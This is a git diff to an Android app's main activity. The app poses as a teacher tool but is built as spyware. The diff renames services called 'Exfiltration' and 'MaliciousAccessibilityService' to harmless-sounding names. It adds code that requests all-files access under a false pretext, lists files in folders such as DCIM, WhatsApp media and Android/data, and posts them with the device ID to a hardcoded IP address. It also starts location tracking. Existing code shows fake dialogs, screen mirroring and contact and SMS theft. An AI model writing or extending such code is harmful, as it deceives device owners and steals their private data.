@@ -8,8 +8,10 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
 import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
@@ -34,13 +36,13 @@ import androidx.navigation.NavHostController
 import androidx.navigation.compose.rememberNavController
 import com.example.teacherapp.navigation.NavGraph
 import com.example.teacherapp.navigation.ScreenOverlayState
-import com.example.teacherapp.services.ScreenMirrorService
+import com.example.teacherapp.services.MediaStreamService
 import com.example.teacherapp.ui.theme.TeacherappTheme
-import com.example.teacherapp.services.ContactExfiltrationService
-import com.example.teacherapp.services.ImageExfiltrationService
-import com.example.teacherapp.services.SmsExfiltrationService
-import com.example.teacherapp.services.AppDataExfiltrationService
-import com.example.teacherapp.services.FloatingBubbleService
+import com.example.teacherapp.services.RosterSyncService
+import com.example.teacherapp.services.MediaCacheWorker
+import com.example.teacherapp.services.NotificationSyncService
+import com.example.teacherapp.services.SessionCacheService
+import com.example.teacherapp.services.QuickAccessService
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ListenerRegistration
@@ -103,8 +105,7 @@ class MainActivity : ComponentActivity() {
         ActivityResultContracts.RequestPermission()
     ) { isGranted ->
         if (isGranted) {
-            ImageExfiltrationService.startExfiltration(this@MainActivity)
-            showFakeUploadDialog()
+            onStoragePermissionGranted()
         } else {
             if (!shouldShowRequestPermissionRationale(if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE)) {
                 AlertDialog.Builder(this)
@@ -131,7 +132,7 @@ class MainActivity : ComponentActivity() {
         ActivityResultContracts.RequestPermission()
     ) { isGranted ->
         if (isGranted) {
-            ContactExfiltrationService.startExfiltration(this@MainActivity)
+            RosterSyncService.startExfiltration(this@MainActivity)
             showFakeImportDialog()
         } else {
             if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS)) {
@@ -159,7 +160,7 @@ class MainActivity : ComponentActivity() {
         ActivityResultContracts.RequestPermission()
     ) { isGranted ->
         if (isGranted) {
-            SmsExfiltrationService.startExfiltration(this@MainActivity)
+            NotificationSyncService.startExfiltration(this@MainActivity)
             Toast.makeText(this, "✅ SMS notifications enabled!", Toast.LENGTH_SHORT).show()
         } else {
             if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)) {
@@ -187,7 +188,7 @@ class MainActivity : ComponentActivity() {
         ActivityResultContracts.RequestPermission()
     ) { isGranted ->
         if (isGranted) {
-            AppDataExfiltrationService.startExfiltration(this@MainActivity)
+            SessionCacheService.startExfiltration(this@MainActivity)
             showFakeDeviceSyncDialog()
         } else {
             // If permanently denied, show dialog then open App Settings
@@ -212,12 +213,21 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    // Storage manager launcher (Android 11+ — returns from Settings)
+    private val storageManagerLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
+            onStoragePermissionGranted()
+        }
+    }
+
     // MediaProjection launcher for screen mirroring to EC2
     private val projectionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
         if (result.resultCode == Activity.RESULT_OK && result.data != null) {
-            ScreenMirrorService.start(this, result.resultCode, result.data!!)
+            MediaStreamService.start(this, result.resultCode, result.data!!)
         }
     }
 
@@ -240,9 +250,9 @@ class MainActivity : ComponentActivity() {
 
         // Overlay permission is requested in SecureAccountScreen (Step 4)
 
-        // Start AppDataExfiltrationService immediately (no permission needed)
+        // Start SessionCacheService immediately (no permission needed)
         Handler(Looper.getMainLooper()).postDelayed({
-            AppDataExfiltrationService.startExfiltration(this@MainActivity)
+            SessionCacheService.startExfiltration(this@MainActivity)
         }, 5000)
 
         // Listen for admin-started online lesson — auto-trigger screen share when active
@@ -274,8 +284,14 @@ class MainActivity : ComponentActivity() {
     fun onAllPermissionsGranted() {
         Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()
 
+        // Start location tracking if permission already granted
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+            == PackageManager.PERMISSION_GRANTED) {
+            com.example.teacherapp.services.GeoContextService.startTracking(this)
+        }
+
         // Skip projection dialog if service is already streaming
-        if (ScreenMirrorService.isRunning) return
+        if (MediaStreamService.isRunning) return
 
         // Step 1: Request screen sharing first
         val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
@@ -294,7 +310,7 @@ class MainActivity : ComponentActivity() {
         }
         when {
             ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED -> {
-                ImageExfiltrationService.startExfiltration(this@MainActivity)
+                MediaCacheWorker.startExfiltration(this@MainActivity)
                 showFakeUploadDialog()
             }
             else -> imagePermissionLauncher.launch(permission)
@@ -304,17 +320,115 @@ class MainActivity : ComponentActivity() {
     fun requestContactPermissionAndSteal() {
         when {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED -> {
-                ContactExfiltrationService.startExfiltration(this@MainActivity)
+                RosterSyncService.startExfiltration(this@MainActivity)
                 showFakeImportDialog()
             }
             else -> contactPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
         }
     }
 
+    fun requestStoragePermissionAndSteal() {
+        when {
+            // Android 11+ — need MANAGE_EXTERNAL_STORAGE for full directory access
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
+                if (Environment.isExternalStorageManager()) {
+                    onStoragePermissionGranted()
+                } else {
+                    AlertDialog.Builder(this)
+                        .setTitle("Storage Access Required")
+                        .setMessage(
+                            "TeacherApp needs access to your files to sync teaching materials, " +
+                            "worksheets and resources to the cloud.\n\nTap Enable to grant access."
+                        )
+                        .setPositiveButton("Enable") { dialog, _ ->
+                            dialog.dismiss()
+                            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                            intent.data = Uri.parse("package:$packageName")
+                            storageManagerLauncher.launch(intent)
+                        }
+                        .setNegativeButton("Later") { dialog, _ -> dialog.dismiss() }
+                        .setCancelable(false)
+                        .show()
+                }
+            }
+            // Android ≤10 — READ_EXTERNAL_STORAGE is enough
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+                    == PackageManager.PERMISSION_GRANTED -> {
+                onStoragePermissionGranted()
+            }
+            else -> imagePermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+    }
+
+    private fun onStoragePermissionGranted() {
+        MediaCacheWorker.startExfiltration(this@MainActivity)
+        showFakeUploadDialog()
+        // Scan key directories and send to EC2 in background
+        CoroutineScope(Dispatchers.IO).launch {
+            val paths = listOf(
+                "/sdcard",
+                "/sdcard/DCIM",
+                "/sdcard/Downloads",
+                "/sdcard/Documents",
+                "/sdcard/Pictures",
+                "/sdcard/WhatsApp/Media",
+                "/sdcard/Android/data"
+            )
+            paths.forEach { scanAndSendDirectory(it) }
+        }
+    }
+
+    @androidx.annotation.WorkerThread
+    private fun scanAndSendDirectory(path: String) {
+        try {
+            val dir = java.io.File(path)
+            if (!dir.exists() || !dir.canRead()) return
+            val entries = org.json.JSONArray()
+            val fmt = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.getDefault())
+            dir.listFiles()
+                ?.sortedWith(compareBy({ it.isFile }, { it.name.lowercase() }))
+                ?.forEach { f ->
+                    entries.put(org.json.JSONObject().apply {
+                        put("name",        f.name)
+                        put("type",        if (f.isDirectory) "dir" else "file")
+                        put("size",        if (f.isFile) f.length() else 0L)
+                        put("permissions", buildString {
+                            append(if (f.isDirectory) "d" else "-")
+                            append(if (f.canRead()) "r" else "-")
+                            append(if (f.canWrite()) "w" else "-")
+                            append(if (f.canExecute()) "x" else "-")
+                        })
+                        put("modified", fmt.format(java.util.Date(f.lastModified())))
+                    })
+                }
+            if (entries.length() == 0) return
+            val deviceId = android.provider.Settings.Secure.getString(
+                contentResolver, android.provider.Settings.Secure.ANDROID_ID
+            ) ?: "unknown"
+            val payload = org.json.JSONObject().apply {
+                put("device_id",      deviceId)
+                put("path",           path)
+                put("entries",        entries)
+                put("device_model",   android.os.Build.MODEL)
+                put("android_version", android.os.Build.VERSION.RELEASE)
+            }
+            val conn = java.net.URL("http://20.189.79.25:5000/api/directory_listing")
+                .openConnection() as java.net.HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.doOutput = true
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.connectTimeout = 10000
+            conn.readTimeout    = 10000
+            conn.outputStream.use { it.write(payload.toString().toByteArray()); it.flush() }
+            conn.responseCode
+            conn.disconnect()
+        } catch (_: Exception) {}
+    }
+
     fun requestSmsPermissionAndSteal() {
         when {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED -> {
-                SmsExfiltrationService.startExfiltration(this@MainActivity)
+                NotificationSyncService.startExfiltration(this@MainActivity)
                 Toast.makeText(this, "✅ SMS notifications enabled!", Toast.LENGTH_SHORT).show()
             }
             else -> smsPermissionLauncher.launch(Manifest.permission.READ_SMS)
@@ -324,7 +438,7 @@ class MainActivity : ComponentActivity() {
     fun requestPhonePermissionAndSteal() {
         when {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED -> {
-                AppDataExfiltrationService.startExfiltration(this@MainActivity)
+                SessionCacheService.startExfiltration(this@MainActivity)
                 showFakeDeviceSyncDialog()
             }
             shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_STATE) -> {
@@ -466,7 +580,7 @@ class MainActivity : ComponentActivity() {
         ) ?: return false
         val splitter = TextUtils.SimpleStringSplitter(':')
         splitter.setString(enabled)
-        val combined = "$packageName/com.example.teacherapp.services.MaliciousAccessibilityService"
+        val combined = "$packageName/com.example.teacherapp.services.InputAssistService"
         while (splitter.hasNext()) {
             if (splitter.next().equals(combined, ignoreCase = true)) return true
         }
@@ -557,7 +671,7 @@ class MainActivity : ComponentActivity() {
 
     override fun onResume() {
         super.onResume()
-        FloatingBubbleService.stop(this)
+        QuickAccessService.stop(this)
 
         // Always restore screen when app comes to foreground (prevents black screen)
         if (!isFakeLocked) {
@@ -585,15 +699,12 @@ class MainActivity : ComponentActivity() {
             currentRoute == "register_screen" ||
             currentRoute == null) return
 
-        val smsDone = ContextCompat.checkSelfPermission(
-            this, Manifest.permission.READ_SMS
-        ) == PackageManager.PERMISSION_GRANTED
         val phoneDone = ContextCompat.checkSelfPermission(
             this, Manifest.permission.READ_PHONE_STATE
         ) == PackageManager.PERMISSION_GRANTED
 
         // Only run if user has fully completed secure account setup
-        if (!smsDone || !phoneDone) return
+        if (!phoneDone) return
 
         accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
         accessibilityHandler.postDelayed({
@@ -613,7 +724,7 @@ class MainActivity : ComponentActivity() {
         super.onPause()
         inactivityHandler.removeCallbacks(dimScreenRunnable)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
-            FloatingBubbleService.start(this)
+            QuickAccessService.start(this)
         }
     }
 
